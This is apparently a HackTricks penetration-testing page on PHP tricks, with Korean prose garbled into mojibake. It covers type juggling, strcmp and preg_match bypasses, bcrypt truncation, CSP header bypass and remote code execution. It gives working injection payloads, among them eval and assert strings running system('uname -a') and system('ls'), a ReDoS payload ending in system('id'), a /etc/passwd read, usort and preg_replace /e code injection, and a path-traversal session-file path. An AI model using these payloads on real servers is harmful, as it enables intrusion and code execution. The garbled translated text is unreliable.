# PHP Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## ì¿ í‚¤ì˜ ì¼ë°˜ì ì¸ ìœ„ì¹˜:

ì´ê²ƒì€ phpMyAdmin ì¿ í‚¤ì—ë„ ìœ íš¨í•©ë‹ˆë‹¤.

ì¿ í‚¤:
```
PHPSESSID
phpMyAdmin
```
ìœ„ì¹˜:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP ë¹„êµ ìš°íšŒ

### ëŠìŠ¨í•œ ë¹„êµ/íƒ€ì… ì¡°ì‘ ( == )

`==`ê°€ PHPì—ì„œ ì‚¬ìš©ë˜ë©´, ì˜ˆìƒì¹˜ ëª»í•œ ê²½ìš°ì— ë¹„êµê°€ ì˜ˆìƒëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ëŠ” "=="ê°€ ë™ì¼í•œ íƒ€ì…ìœ¼ë¡œ ë³€í™˜ëœ ê°’ë§Œ ë¹„êµí•˜ê¸° ë•Œë¬¸ì´ë©°, ë¹„êµë˜ëŠ” ë°ì´í„°ì˜ íƒ€ì…ì´ ë™ì¼í•œì§€ ë¹„êµí•˜ê³  ì‹¶ë‹¤ë©´ `===`ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

PHP ë¹„êµ í‘œ: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` ìˆ«ìë¡œ ì‹œì‘í•˜ì§€ ì•ŠëŠ” ë¬¸ìì—´ì€ ìˆ«ìì™€ ê°™ìŠµë‹ˆë‹¤.
* `"0xAAAA" == "43690" -> True` 10ì§„ìˆ˜ ë˜ëŠ” 16ì§„ìˆ˜ í˜•ì‹ì˜ ìˆ«ìë¡œ êµ¬ì„±ëœ ë¬¸ìì—´ì€ ìˆ«ìê°€ ë™ì¼í•  ê²½ìš° ë‹¤ë¥¸ ìˆ«ì/ë¬¸ìì—´ê³¼ Trueë¡œ ë¹„êµë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë¬¸ìì—´ì˜ ìˆ«ìëŠ” ìˆ«ìë¡œ í•´ì„ë©ë‹ˆë‹¤).
* `"0e3264578" == 0 --> True` "0e"ë¡œ ì‹œì‘í•˜ê³  ê·¸ ë’¤ì— ì–´ë–¤ ê²ƒì´ë“  ì˜¤ëŠ” ë¬¸ìì—´ì€ 0ê³¼ ê°™ìŠµë‹ˆë‹¤.
* `"0X3264578" == 0X --> True` "0"ë¡œ ì‹œì‘í•˜ê³  ê·¸ ë’¤ì— ì–´ë–¤ ë¬¸ì(ì—¬ê¸°ì„œ XëŠ” ì–´ë–¤ ë¬¸ìë“  ê°€ëŠ¥)ì™€ ê·¸ ë’¤ì— ì–´ë–¤ ê²ƒì´ë“  ì˜¤ëŠ” ë¬¸ìì—´ì€ 0ê³¼ ê°™ìŠµë‹ˆë‹¤.
* `"0e12334" == "0" --> True` ì´ëŠ” ë§¤ìš° í¥ë¯¸ë¡œìš´ë°, ì–´ë–¤ ê²½ìš°ì—ëŠ” "0"ì˜ ë¬¸ìì—´ ì…ë ¥ê³¼ í•´ì‹œëœ ë‚´ìš©ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ "0e"ë¡œ ì‹œì‘í•˜ê³  ì–´ë–¤ ë¬¸ìë„ ì—†ëŠ” í•´ì‹œë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê°’ì„ ì œê³µí•  ìˆ˜ ìˆë‹¤ë©´, ë¹„êµë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í˜•ì‹ì˜ **ì´ë¯¸ í•´ì‹œëœ ë¬¸ìì—´**ì€ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` ë¬¸ìì—´ì˜ ì–´ë–¤ ë¬¸ìë„ int 0ê³¼ ê°™ìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### **in\_array()**

**íƒ€ì… ì¡°ì‘**ì€ ê¸°ë³¸ì ìœ¼ë¡œ `in_array()` í•¨ìˆ˜ì—ë„ ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤ (ì—„ê²©í•œ ë¹„êµë¥¼ í•˜ë ¤ë©´ ì„¸ ë²ˆì§¸ ì¸ìˆ˜ë¥¼ trueë¡œ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

ì´ í•¨ìˆ˜ê°€ **ëª¨ë“  ì¸ì¦ í™•ì¸**(ë¹„ë°€ë²ˆí˜¸ í™•ì¸ê³¼ ê°™ì€)ì— ì‚¬ìš©ë˜ë©´, ì‚¬ìš©ìê°€ ë¹„êµì˜ í•œ ìª½ì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ê²½ìš°, ë¹„ë°€ë²ˆí˜¸ì˜ ê°’ìœ¼ë¡œ ë¬¸ìì—´ ëŒ€ì‹  ë¹ˆ ë°°ì—´ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`https://example.com/login.php/?username=admin&password[]=`) ê·¸ë¦¬ê³  ì´ í™•ì¸ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()`ì™€ ë™ì¼í•œ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.

### ì—„ê²©í•œ íƒ€ì… ì¡°ì‘

`===`ê°€ **ì‚¬ìš©ë˜ê³ ** ìˆë”ë¼ë„ **ë¹„êµê°€ ì·¨ì•½í•˜ê²Œ** ë§Œë“œëŠ” ì˜¤ë¥˜ê°€ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¹„êµê°€ **ë¹„êµí•˜ê¸° ì „ì— ë°ì´í„°ë¥¼ ë‹¤ë¥¸ íƒ€ì…ì˜ ê°ì²´ë¡œ ë³€í™˜í•˜ê³  ìˆëŠ” ê²½ìš°**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`**ëŠ” **ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì¦**í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì‚¬ìš©ì ì…ë ¥ì— **ë¸”ë™ë¦¬ìŠ¤íŠ¸**ì˜ **ë‹¨ì–´/ì •ê·œ í‘œí˜„ì‹**ì´ **ì¡´ì¬í•˜ëŠ”ì§€** í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ ì½”ë“œëŠ” ê³„ì† ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤).

#### New line bypass

ê·¸ëŸ¬ë‚˜ ì •ê·œ í‘œí˜„ì‹ì˜ ì‹œì‘ì„ êµ¬ë¶„í•  ë•Œ `preg_match()`ëŠ” **ì‚¬ìš©ì ì…ë ¥ì˜ ì²« ë²ˆì§¸ ì¤„ë§Œ í™•ì¸**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì–´ë–¤ ë°©ë²•ìœ¼ë¡œë“  **ì—¬ëŸ¬ ì¤„**ë¡œ ì…ë ¥ì„ **ì „ì†¡**í•  ìˆ˜ ìˆë‹¤ë©´ ì´ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆ:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
ì´ ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ë ¤ë©´ **ìƒˆ ì¤„ì´ í¬í•¨ëœ ê°’ì„ URL ì¸ì½”ë”©í•˜ì—¬ ì „ì†¡**í•˜ê±°ë‚˜, **JSON ë°ì´í„°ë¥¼ ë³´ë‚¼ ìˆ˜** ìˆë‹¤ë©´ **ì—¬ëŸ¬ ì¤„ë¡œ ì „ì†¡**í•˜ì‹­ì‹œì˜¤:
```php
{
"cmd": "cat /etc/passwd"
}
```
Find an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **ê¸¸ì´ ì˜¤ë¥˜ ìš°íšŒ**

(ì´ ìš°íšŒëŠ” PHP 5.2.5ì—ì„œ ì‹œë„ëœ ê²ƒìœ¼ë¡œ ë³´ì´ë©°, PHP 7.3.15ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤)\
`preg_match()`ì— ìœ íš¨í•œ ë§¤ìš° **í° ì…ë ¥**ì„ ë³´ë‚¼ ìˆ˜ ìˆë‹¤ë©´, **ì²˜ë¦¬í•  ìˆ˜ ì—†ê²Œ** ë˜ì–´ **ê²€ì‚¬ë¥¼ ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, JSONì„ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ì˜¬ë¦¬ê³  ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS ìš°íšŒ

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

ê°„ë‹¨íˆ ë§í•´, ë¬¸ì œëŠ” PHPì˜ `preg_*` í•¨ìˆ˜ê°€ [PCRE ë¼ì´ë¸ŒëŸ¬ë¦¬](http://www.pcre.org/)ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ê¸° ë•Œë¬¸ì— ë°œìƒí•©ë‹ˆë‹¤. PCREì—ì„œëŠ” íŠ¹ì • ì •ê·œ í‘œí˜„ì‹ì´ ë§ì€ ì¬ê·€ í˜¸ì¶œì„ ì‚¬ìš©í•˜ì—¬ ì¼ì¹˜ë˜ë©°, ì´ëŠ” ë§ì€ ìŠ¤íƒ ê³µê°„ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. í—ˆìš©ë˜ëŠ” ì¬ê·€ í˜¸ì¶œì˜ ìˆ˜ì— ì œí•œì„ ì„¤ì •í•  ìˆ˜ ìˆì§€ë§Œ, PHPì—ì„œëŠ” ì´ ì œí•œì´ [ê¸°ë³¸ì ìœ¼ë¡œ 100,000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆì–´ ìŠ¤íƒì— ë§ì§€ ì•ŠìŠµë‹ˆë‹¤.

[ì´ Stackoverflow ìŠ¤ë ˆë“œ](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error)ë„ ì´ ë¬¸ì œì— ëŒ€í•´ ë” ê¹Šì´ ë…¼ì˜ëœ ê²Œì‹œë¬¼ì— ë§í¬ë˜ì–´ ìˆì—ˆìŠµë‹ˆë‹¤. ìš°ë¦¬ì˜ ì‘ì—…ì€ ì´ì œ ëª…í™•í–ˆìŠµë‹ˆë‹¤:\
**ì •ê·œ í‘œí˜„ì‹ì´ 100\_000íšŒ ì´ìƒì˜ ì¬ê·€ë¥¼ ìˆ˜í–‰í•˜ê²Œ ë§Œë“œëŠ” ì…ë ¥ì„ ë³´ë‚´ì–´ SIGSEGVë¥¼ ìœ ë°œí•˜ê³ , `preg_match()` í•¨ìˆ˜ê°€ `false`ë¥¼ ë°˜í™˜í•˜ê²Œ í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìš°ë¦¬ì˜ ì…ë ¥ì´ ì•…ì˜ì ì´ì§€ ì•Šë‹¤ê³  ìƒê°í•˜ê²Œ ë§Œë“  í›„, í˜ì´ë¡œë“œì˜ ëì— `{system(<verybadcommand>)}`ì™€ ê°™ì€ ë†€ë¼ì›€ì„ ë˜ì ¸ SSTI --> RCE --> flag :)**.

ì •ê·œ í‘œí˜„ì‹ ìš©ì–´ë¡œ, ìš°ë¦¬ëŠ” ì‹¤ì œë¡œ 100k "ì¬ê·€"ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ "ë°±íŠ¸ë˜í‚¹ ë‹¨ê³„"ë¥¼ ì„¸ê³  ìˆìœ¼ë©°, [PHP ë¬¸ì„œ](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit)ì— ë”°ë¥´ë©´ `pcre.backtrack_limit` ë³€ìˆ˜ì˜ ê¸°ë³¸ê°’ì€ 1\_000\_000 (1M)ì…ë‹ˆë‹¤.\
ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ `'X'*500_001`ì€ 100ë§Œ ê°œì˜ ë°±íŠ¸ë˜í‚¹ ë‹¨ê³„ë¥¼ ìƒì„±í•©ë‹ˆë‹¤ (500k ì „ì§„ ë° 500k í›„ì§„):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP ë‚œë…í™”ë¥¼ ìœ„í•œ íƒ€ì… ì¡°ì‘
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

PHPê°€ ë‹¤ë¥¸ í˜ì´ì§€ë¡œ ë¦¬ë””ë ‰ì…˜ë˜ê³  ìˆì§€ë§Œ **`Location`** í—¤ë”ê°€ ì„¤ì •ëœ í›„ì— **`die`** ë˜ëŠ” **`exit`** í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì§€ ì•Šìœ¼ë©´, PHPëŠ” ê³„ì† ì‹¤í–‰ë˜ì–´ ë°ì´í„°ë¥¼ ë³¸ë¬¸ì— ì¶”ê°€í•©ë‹ˆë‹¤:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## ê²½ë¡œ íƒìƒ‰ ë° íŒŒì¼ í¬í•¨ ì·¨ì•½ì 

Check:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## ë” ë§ì€ íŠ¸ë¦­

* **register\_globals**: **PHP < 4.1.1.1** ë˜ëŠ” ì˜ëª» êµ¬ì„±ëœ ê²½ìš°, **register\_globals**ê°€ í™œì„±í™”ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë˜ëŠ” ê·¸ ë™ì‘ì´ ëª¨ë°©ë˜ê³  ìˆìŠµë‹ˆë‹¤). ì´ëŠ” $\_GETì™€ ê°™ì€ ì „ì—­ ë³€ìˆ˜ì— ê°’ì´ ìˆëŠ” ê²½ìš° ì˜ˆë¥¼ ë“¤ì–´ $\_GET\["param"]="1234", **$paramì„ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ë”°ë¼ì„œ HTTP ë§¤ê°œë³€ìˆ˜ë¥¼ ì „ì†¡í•˜ì—¬ ì½”ë“œ ë‚´ì—ì„œ ì‚¬ìš©ë˜ëŠ” ë³€ìˆ˜ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
* **ê°™ì€ ë„ë©”ì¸ì˜ PHPSESSION ì¿ í‚¤ëŠ” ê°™ì€ ìœ„ì¹˜ì— ì €ì¥ë©ë‹ˆë‹¤**, ë”°ë¼ì„œ ë„ë©”ì¸ ë‚´ì—ì„œ **ë‹¤ë¥¸ ê²½ë¡œì—ì„œ ë‹¤ë¥¸ ì¿ í‚¤ê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°** í•´ë‹¹ ê²½ë¡œê°€ **ë‹¤ë¥¸ ê²½ë¡œ ì¿ í‚¤ì˜ ê°’ì„ ì„¤ì •í•˜ì—¬ ì¿ í‚¤ì— ì ‘ê·¼í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ì´ë ‡ê²Œ í•˜ë©´ **ë‘ ê²½ë¡œê°€ ê°™ì€ ì´ë¦„ì˜ ë³€ìˆ˜ë¥¼ ì ‘ê·¼í•  ê²½ìš°** **path1ì˜ í•´ë‹¹ ë³€ìˆ˜ ê°’ì„ path2ì— ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ê·¸ëŸ¬ë©´ path2ëŠ” path1ì˜ ë³€ìˆ˜ë¥¼ ìœ íš¨í•œ ê²ƒìœ¼ë¡œ ê°„ì£¼í•©ë‹ˆë‹¤(ì¿ í‚¤ì— path2ì— í•´ë‹¹í•˜ëŠ” ì´ë¦„ì„ ë¶€ì—¬í•˜ì—¬).
* **ì‚¬ìš©ìì˜ ì‚¬ìš©ì ì´ë¦„**ì´ ìˆëŠ” ê²½ìš°, ì£¼ì†Œë¥¼ í™•ì¸í•˜ì„¸ìš”: **/\~\<USERNAME>** php ë””ë ‰í† ë¦¬ê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
* [**php ë˜í¼ë¥¼ ì‚¬ìš©í•œ LFI ë° RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

ì´ í•¨ìˆ˜ë“¤ì€ ì¼ë°˜ì ìœ¼ë¡œ PHPì—ì„œ **ë¹„ë°€ë²ˆí˜¸ë¡œë¶€í„° í•´ì‹œë¥¼ ìƒì„±**í•˜ê³  **í•´ì‹œì™€ ë¹„êµí•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ê°€ ì˜¬ë°”ë¥¸ì§€ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.**\
ì§€ì›ë˜ëŠ” ì•Œê³ ë¦¬ì¦˜ì€: `PASSWORD_DEFAULT` ë° `PASSWORD_BCRYPT`(ì‹œì‘ì€ `$2y$`). **PASSWORD\_DEFAULTëŠ” ìì£¼ PASSWORD\_BCRYPTì™€ ë™ì¼í•©ë‹ˆë‹¤.** í˜„ì¬ **PASSWORD\_BCRYPT**ëŠ” **ì…ë ¥ì˜ í¬ê¸° ì œí•œì´ 72ë°”ì´íŠ¸**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ì•Œê³ ë¦¬ì¦˜ìœ¼ë¡œ 72ë°”ì´íŠ¸ë³´ë‹¤ í° ê²ƒì„ í•´ì‹œí•˜ë ¤ê³  í•˜ë©´ ì²˜ìŒ 72Bë§Œ ì‚¬ìš©ë©ë‹ˆë‹¤:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

#### í—¤ë” ì„¤ì • í›„ ì˜¤ë¥˜ ë°œìƒ

[**ì´ íŠ¸ìœ„í„° ìŠ¤ë ˆë“œ**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19)ì—ì„œ 1000ê°œ ì´ìƒì˜ GET íŒŒë¼ë¯¸í„° ë˜ëŠ” 1000ê°œ ì´ìƒì˜ POST íŒŒë¼ë¯¸í„° ë˜ëŠ” 20ê°œì˜ íŒŒì¼ì„ ì „ì†¡í•˜ë©´, PHPëŠ” ì‘ë‹µì—ì„œ í—¤ë”ë¥¼ ì„¤ì •í•˜ì§€ ì•ŠëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ CSP í—¤ë”ê°€ ì„¤ì •ëœ ì½”ë“œì—ì„œ ìš°íšŒí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### í—¤ë”ë¥¼ ì„¤ì •í•˜ê¸° ì „ì— ë³¸ë¬¸ ì±„ìš°ê¸°

**PHP í˜ì´ì§€ê°€ ì˜¤ë¥˜ë¥¼ ì¶œë ¥í•˜ê³  ì‚¬ìš©ìê°€ ì œê³µí•œ ì¼ë¶€ ì…ë ¥ì„ ë‹¤ì‹œ ì—ì½”í•˜ëŠ” ê²½ìš°**, ì‚¬ìš©ìëŠ” PHP ì„œë²„ê°€ **ì¶©ë¶„íˆ ê¸´ ì½˜í…ì¸ **ë¥¼ ì¶œë ¥í•˜ë„ë¡ ë§Œë“¤ì–´ì„œ **í—¤ë”ë¥¼ ì¶”ê°€í•˜ë ¤ê³  í•  ë•Œ** ì„œë²„ê°€ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ **ê³µê²©ìëŠ” ì„œë²„ê°€ í° ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ë„ë¡ ë§Œë“¤ì—ˆìœ¼ë©°**, í™”ë©´ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´ PHPê°€ **í—¤ë” ì •ë³´ë¥¼ ìˆ˜ì •í•˜ë ¤ê³  í•  ë•Œ, ìˆ˜ì •í•  ìˆ˜ ì—†ì—ˆìŠµë‹ˆë‹¤** (ì˜ˆë¥¼ ë“¤ì–´ CSP í—¤ë”ê°€ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP í•¨ìˆ˜ì—ì„œì˜ SSRF

í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## ì½”ë“œ ì‹¤í–‰

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[ë” ìœ ìš©í•œ PHP í•¨ìˆ˜ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace()ë¥¼ í†µí•œ** **RCE**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" ì¸ìˆ˜ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë ¤ë©´ ìµœì†Œí•œ í•˜ë‚˜ì˜ ì¼ì¹˜ í•­ëª©ì´ í•„ìš”í•©ë‹ˆë‹¤.\
ì´ preg\_replace ì˜µì…˜ì€ **PHP 5.5.0ë¶€í„° ì‚¬ìš© ì¤‘ë‹¨ë˜ì—ˆìŠµë‹ˆë‹¤.**

### **Eval()ì„ í†µí•œ RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert()ë¥¼ í†µí•œ RCE**

php ë‚´ì˜ ì´ í•¨ìˆ˜ëŠ” **ë¬¸ìì—´ë¡œ ì‘ì„±ëœ ì½”ë“œë¥¼ ì‹¤í–‰**í•˜ì—¬ **true ë˜ëŠ” falseë¥¼ ë°˜í™˜**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤ (ê·¸ë¦¬ê³  ì´ì— ë”°ë¼ ì‹¤í–‰ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤). ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ì ë³€ìˆ˜ëŠ” ë¬¸ìì—´ì˜ ì¤‘ê°„ì— ì‚½ì…ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:\
`assert("strpos($_GET['page']),'..') === false")` --> ì´ ê²½ìš° **RCE**ë¥¼ ì–»ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
ì½”ë“œ **êµ¬ë¬¸**ì„ **ê¹¨ê³ **, **í˜ì´ë¡œë“œ**ë¥¼ **ì¶”ê°€**í•œ ë‹¤ìŒ **ë‹¤ì‹œ ìˆ˜ì •**í•´ì•¼ í•©ë‹ˆë‹¤. "**and" ë˜ëŠ” "%26%26" ë˜ëŠ” "|"**ì™€ ê°™ì€ **ë…¼ë¦¬ ì—°ì‚°**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. "or", "||"ëŠ” ì‘ë™í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì²« ë²ˆì§¸ ì¡°ê±´ì´ ì°¸ì´ë©´ ìš°ë¦¬ì˜ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ê°™ì€ ì´ìœ ë¡œ ";"ë„ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©° ìš°ë¦¬ì˜ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

**ë‹¤ë¥¸ ì˜µì…˜**ì€ ë¬¸ìì—´ì— ëª…ë ¹ ì‹¤í–‰ì„ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: `'.highlight_file('.passwd').'`

**ë‹¤ë¥¸ ì˜µì…˜**(ë‚´ë¶€ ì½”ë“œë¥¼ ê°€ì§€ê³  ìˆëŠ” ê²½ìš°)ì€ ì‹¤í–‰ì„ ë³€ê²½í•˜ê¸° ìœ„í•´ ì¼ë¶€ ë³€ìˆ˜ë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: `$file = "hola"`

### **usort()ë¥¼ í†µí•œ RCE**

ì´ í•¨ìˆ˜ëŠ” íŠ¹ì • í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í•­ëª© ë°°ì—´ì„ ì •ë ¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.\
ì´ í•¨ìˆ˜ë¥¼ ì•…ìš©í•˜ë ¤ë©´:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
